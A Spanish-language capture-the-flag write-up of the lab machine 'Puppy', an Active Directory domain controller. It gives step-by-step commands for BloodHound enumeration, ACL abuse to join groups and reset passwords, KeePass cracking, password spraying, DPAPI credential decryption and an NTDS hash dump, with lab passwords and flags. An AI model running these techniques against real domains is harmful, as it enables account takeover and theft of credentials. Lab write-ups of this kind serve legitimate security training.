Con el puerto 88 (Kerberos) abierto junto a 389/445, la máquina es un controlador de dominio de Active Directory. Un escaneo más profundo revela el dominio puppy.htb, que se añade al /etc/hosts. La cuenta inicial levi.james no tiene permisos de WinRM, así que se recurre a BloodHound antes de seguir.
// 02

BLOODHOUND — GenericWrite hacia developers

Se recopila información del dominio con bloodhound-python usando las credenciales dadas.

recolección de datos con bloodhound
bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d 'puppy.htb' -ns 10.129.232.75 -c all --zip
GenericWrite de HR sobre developers
levi.james pertenece al grupo HR, que tiene GenericWrite sobre el grupo DEVELOPERS. Eso permite añadirse directamente a ese grupo.
añadirse al grupo developers
net rpc group addmem 'DEVELOPERS' 'levi.james' -U 'puppy.htb'/'levi.james'%'KingofAkron2025!' -S DC

Como miembro de DEVELOPERS, se listan de nuevo los shares SMB y aparece uno nuevo.

listado de shares
nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --shares
Share Permissions Remark ----- ----------- ------ ADMIN$ Remote Admin C$ Default share DEV READ DEV-SHARE for PUPPY-DEVS IPC$ READ Remote IPC NETLOGON READ Logon server share SYSVOL Logon server share

Dentro de DEV hay un fichero recovery.kdbx — una base de datos de KeePass.

// 03

KEEPASS — Crackeo de recovery.kdbx

Al intentar abrir el .kdbx pide contraseña maestra. Se extrae el hash con keepass2john y se crackea con john.

crackeo de la base de datos keepass
keepass2john recovery.kdbx > kdbx_hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt kdbx_hash.txt
Contraseña maestra crackeada
La contraseña es liverpool. Dentro de la base de datos hay varias entradas con credenciales de usuarios del dominio: Adam Silver, Antony C. Edwards, Jamie Williams, Samuel Blake y Steve Tucker.

Con esas contraseñas se lanza un password spraying contra SMB.

password spraying con las contraseñas del kdbx
nxc smb 10.129.232.75 -u users.txt -p pass.txt --continue-on-success
Credenciales válidas
El usuario ant.edwards tiene la contraseña Antman2025!, aunque tampoco tiene permisos de WinRM.
// 04

GENERICALL — Reset de adam.silver

Se marca a ant.edwards como comprometido en BloodHound y aparece un nuevo camino: ant.edwards ∈ SENIOR DEVS, que tiene GenericAll sobre adam.silver — miembro de REMOTE MANAGEMENT USERS (WinRM).

Se abusa del GenericAll para resetear la contraseña de adam.silver.

reset de contraseña
net rpc password 'adam.silver' 'newpass123!' -U 'puppy.htb'/'ant.edwards'%'Antman2025!' -S DC

Al intentar entrar por SMB con la nueva contraseña, la cuenta aparece deshabilitada.

PUPPY.HTB\adam.silver:newpass123! STATUS_ACCOUNT_DISABLED

Se habilita la cuenta modificando su atributo userAccountControl con bloodyAD, aprovechando el mismo GenericAll.

habilitar la cuenta
bloodyAD --host 10.129.232.75 -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set object 'adam.silver' userAccountControl -v 512

Con la cuenta habilitada, se accede por WinRM.

acceso winrm como adam.silver
evil-winrm -i puppy.htb -u 'adam.silver' -p 'newpass123!'
USER FLAG 54860f652f094265a6765ae5bcc6da80
// 05

POST-EXPLOTACIÓN — Backup con credenciales LDAP

WinPEAS no encuentra nada relevante, así que se enumera manualmente el sistema de ficheros. Aparece C:\Backups\site-backup-2024-12-30.zip, que se descarga y descomprime.

Credenciales en un fichero de configuración de backup
Dentro hay un nms-auth-config.xml.bak con la configuración LDAP de una aplicación, incluyendo el bind-dn y la contraseña en texto claro:
nms-auth-config.xml.bak
<bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn> <bind-password>ChefSteph2025!</bind-password>

Se comprueba y steph.cooper también tiene permisos de WinRM.

acceso winrm como steph.cooper
evil-winrm -i puppy.htb -u 'steph.cooper' -p 'ChefSteph2025!'
// 06

DPAPI — Credenciales guardadas de steph.cooper

¿Qué es DPAPI?
Windows usa DPAPI (Data Protection API) para cifrar en disco credenciales guardadas, contraseñas de Wi-Fi, cookies, etc. Los blobs cifrados (en %APPDATA%\Microsoft\Credentials) están protegidos por una masterkey (en %APPDATA%\Microsoft\Protect\<SID>), que a su vez está cifrada con la contraseña del usuario. Con la contraseña de steph.cooper se puede descifrar su masterkey y, con ella, cualquier credencial que tenga guardada.

Se localizan y descargan ambos ficheros.

localización de blobs dpapi
ls -force C:\Users\steph.cooper\appdata\roaming\microsoft\credentials ls -force C:\Users\steph.cooper\appdata\roaming\microsoft\protect\S-1-5-21-...-1107

Se descifra primero la masterkey con la contraseña de steph.cooper.

1. descifrado de la masterkey
impacket-dpapi masterkey -file masterkey.blob -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28480d8d9cbfdcaf319e9c84

Con la clave descifrada, se descifra la credencial guardada.

2. descifrado de la credencial
impacket-dpapi credential -file cred.blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28480d8d9cbfdcaf319e9c84
Credenciales de steph.cooper_adm
Se obtienen las credenciales steph.cooper_adm:FivethChipOnItsWay2025!. Según BloodHound, este usuario pertenece al grupo Administrators.

Se accede por WinRM y se confirma el acceso total al sistema.

acceso winrm como steph.cooper_adm
evil-winrm -i puppy.htb -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
ADMIN FLAG 23cf11612baaae38dc252e749eec56b2
// 07

EXTRA — Control total del dominio

Como dato adicional (no necesario para las flags), BloodHound muestra que steph.cooper_adm pertenece al grupo Administrators, que tiene GenericWrite sobre Domain Admins. Añadiéndose a ese grupo se obtiene control total del dominio.

añadirse a domain admins
net rpc group addmem 'Domain Admins' 'steph.cooper_adm' -U 'puppy.htb'/'steph.cooper_adm'%'FivethChipOnItsWay2025!' -S DC

Con esto se puede volcar el NTDS.dit completo del dominio.

volcado de hashes del dominio
impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!@10.129.232.75' -just-dc
Game Over del dominio
Con los hashes de todas las cuentas (incluido krbtgt) se podría autenticar como cualquier usuario, forjar un Golden Ticket o mantener persistencia total sobre puppy.htb.
